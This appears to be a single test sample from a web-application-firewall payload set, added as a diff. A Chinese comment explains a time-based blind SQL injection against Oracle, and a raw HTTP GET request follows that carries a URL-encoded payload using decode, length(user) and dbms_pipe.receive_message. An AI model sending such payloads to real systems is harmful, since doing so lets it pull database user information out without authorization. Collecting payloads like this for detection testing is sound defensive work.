@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_延时注入-06506320
+# 攻击者基于延时查询，将"(select decode(substr((select banner from sys.v_$version where rownum=1),1,1),'O', dbms_pipe.receive_message('ICQ', 5),0) from dual)=3"语句注入到 SQL 查询参数中，利用函数length函数计算用户名长度，利用函数dbms_pipe.receive_message、decode等函数来延长数据库处理时间，通过加载时间来对注入结果进行判定以获取数据库用户信息。
+GET /?id=1%20and%20%28select%20decode%28length%28user%29%2C4%2Cdbms_pipe.receive_message%28%27ICQ%27%2C%205%29%2C0%29%20from%20dual%29=1&bid=hd_tag_m8mv2405 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2405
+RM-PRO-Token: f45f3b55af0bf721b77052fe505aecd2
+RM-PRO-Time: 1742808356079
+User-Agent: curl/7.83.1
+
